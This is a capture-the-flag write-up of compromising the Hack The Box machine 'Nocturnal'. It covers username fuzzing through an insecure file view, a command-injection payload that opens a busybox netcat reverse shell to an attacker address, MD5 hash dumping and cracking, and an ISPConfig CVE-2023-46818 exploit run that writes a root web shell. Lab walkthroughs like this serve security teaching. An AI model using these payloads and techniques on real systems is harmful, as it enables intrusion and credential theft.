We start with nmap scan
```bash
nmap -p- -sC -sV -vv -T4-min-rate=10000 10.10.11.64 
```
```bash
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Here we can see the ports 22 and 80.
Then we have to add nocturnal.htb to the /etc/hosts file
The website had nothing of interest so I did an gobuster scan
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://nocturnal.htb/ -t 100
```
and we found /uploads /backups and /uploads2...
BUT this quote on the website seemed quite exiting "Please login or register to start uploading and viewing your files." I feel like this is our way to gain access to the machine...
Im not sure if they do checking of the filetype sent, so i'll just send a php monkey reverse shell.. I did some manual testing, but decided to open BURPSUITE and check the post request in more detail and i found out the following
```bash
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
```
I tried all types of file uploads but nothing worked. Then I realized that I could view other peoples files from the url
```bash
http://nocturnal.htb/view.php?username=<NAMEHERE>&file=shell.docx
```
From this i was able to bruteforce a name list and see if there was an account with important info in their files..
```bash
wfuzz -c -u "http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx" -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -H "Cookie:PHPSESSID=s4s4dlpv6e8c8ijj01jmgaua7p" --hs "User not found"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx
Total requests: 10713

=====================================================================
ID           Response   Lines    Word       Chars       Payload                  
=====================================================================

000000093:   200        128 L    247 W      3037 Ch     "admin"                  
000000412:   200        128 L    249 W      3183 Ch     "amanda"                 
000000673:   200        128 L    261 W      4139 Ch     "apple"                  
000009880:   200        128 L    247 W      3037 Ch     "tobias"  
```
Only amanda had something interesting and that was the file called "privacy.odt"
There we could find out that amandas password was/is arHkG7HAI68X8s1J.
Since amanda has admin panel I'm guessing we are able to change the types of files the site accepts..

Then I got stuck and had to research and apparently the backup zip folder function is exploitable and you can use a list form https://github.com/payloadbox/command-injection-payload-list to go through and see how to bypass the code..
```bash
%0A
```
is how we are able to end the previous command and to get a space we will use %09. we can use this to get a reverse shell on the site
```bash
password=%0abash%09-c%09"busybox%09nc%0910.10.14.60%094444%09-e%09/bin/bash”&backup=
```
And now we have a shell but lets make it better
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
After enumerating the machine for a while I found an account named tobias which we don't have access to but I did find a nocturnal_database.db and lets check it out using sqlite3 
```bash3
sqlite> select * from users
select * from users
   ...> ;
;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|hola|4d186321c1a7f0f354b297e8914ab240
9|zeroz|098f6bcd4621d373cade4e832627b4f6
10|elix|88bcdc7adaac45917b4418bfa32f2bd6
11|test|098f6bcd4621d373cade4e832627b4f6
12|toto|06b422eab39b1695e023c1da3c724557
13|transit|81dc9bdb52d04dc20036dbd8313ed055
14|s|0c63a3452c46569a70c4fedbf2a84e86
15|test12|60474c9c10d7142b7508ce7a50acf414
16|hacker|d6a6bc0db10694a2d90e3a69648f3a03
17|s4vitar@s4vitar.com|313439c1ba104eeac8d78c2a98de2365
18|apple|5675e0581e5a19f739222a07b70c0860
19|isda|502d5f9b6525af9d09c70672a7f48a05
```
Now its just a matter of cracking them with hashcat.
```bash
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```
first flag
```bash
tobias@nocturnal:~$ cat user.txt 
c13c01d98ff71a9d5110374e0f2341a9
```
Instead of doing manual work ill import the linpeass over.
```bash
python3 -m http.server 8000
wget http://10.10.14.60:8000/linpeas.sh
```
After enumerating the machine for ages I found out that there is a service on localhost port 8080
and I connect to it with port forwarding
```bash
ssh -L 8000:127.0.0.1:8080 tobias@10.10.11.64
```
There was a login screen and i was stuck on it for quite a while but after trying multiple things the ones that worked was
```bash
admin:slowmotionapocalypse
```
And now we have access to the ISPCONFIG website. I decided to look for some privescalations on ISPConfig Version: 3.2.10p1. And I found this https://nvd.nist.gov/vuln/detail/CVE-2023-46818
```bash
Description
An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in thelanguage file editor by an admin if admin_allow_langedit is enabled.
```
Now we just run the script and get a root shell
```bash
python3 CVE-2023-46818.py http://127.0.0.1:8080 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_4ba22ccb226a723b679653c8
[+] CSRF Key: 7f0b7e9e537cf0a4b8f92b13e73c778c00c581dd
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8080/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root

ispconfig-shell# cat /root/root.txt
1553099a6f18b90469778a90e420f82e
```
This took me multiple hours. I think the hardest part was figuring out the exploit to the the initial reverse shell but the things after that were quite reasonable.

